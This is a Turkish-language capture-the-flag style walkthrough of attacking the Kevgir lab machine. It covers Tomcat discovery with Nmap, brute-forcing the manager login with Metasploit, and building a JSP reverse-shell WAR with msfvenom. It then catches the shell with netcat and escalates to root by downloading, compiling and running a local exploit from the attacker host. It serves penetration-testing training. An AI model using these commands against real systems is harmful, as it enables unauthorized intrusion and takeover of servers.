

Nmap taramasın da 8080 portunda bir Tomcat sunucusu çalıştığını billiyorduk .

```
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat
```

![[KevgirTomcat.png]]


Bu sayfa Tomcatin başarıyla kurulduğunu ve çalıştığını gösteren varsayılan bir sayfadır. "Manager webapp" dediğimiz de bizi bir login popup karşılamaktadır.

![[kevgir tomcat login.png]]


Bruteforce için metasploit kullanacağız . 

```
search tomcat
use 27
set RHOSTS 10.0.2.10
run
```

```
[+] 10.0.2.10:8080 - Login Successful: tomcat:tomcat
```


Tomcate giriş yaptığımıza göre shell alarak sistem içerisine sızma işlemi yapabiliriz. 

![[KevgirTomcatdeploy.png]]

Reverse shell alabilmek için `msfvenom` kullanarak .war uzantılı Java ile yazılmış bir reverse shell dosyası oluşturuyoruz.

``msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.2.15 -f war > payload.war``

Msfvenomda payloadları görmek için 

`msfvenom --list payload`
Sisteme dosyamı yüklemeden önce NetCat ile reverse shell dsoyamı oluşturduğum port adresimle(default 4444) ağı dinliyorum . 

``nc -lvnp 4444``

``python3 -c 'import pty; pty.spawn("/bin/bash")'``


---

```
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD  java/jsp_shell_reverse_tcp
PAYLOAD => java/jsp_shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 10.0.2.10
LHOST => 10.0.2.10
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
````

```
admin@canyoupwnme:~$ wget http://10.0.2.15/39166.c 
wget http://10.0.2.15/39166.c 
--2024-10-21 15:01:41--  http://10.0.2.15/39166.c
Connecting to 10.0.2.15:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2789 (2.7K) [text/x-csrc]
Saving to: ‘39166.c’

100%[======================================>] 2,789       --.-K/s   in 0s      

2024-10-21 15:01:41 (448 MB/s) - ‘39166.c’ saved [2789/2789]

admin@canyoupwnme:~$ gcc 39166.c -o root 
gcc 39166.c -o root
admin@canyoupwnme:~$ ./root
./root
root@canyoupwnme:~# ls
ls
39166.c  39230.c  linpeas.sh  root
root@canyoupwnme:~#
```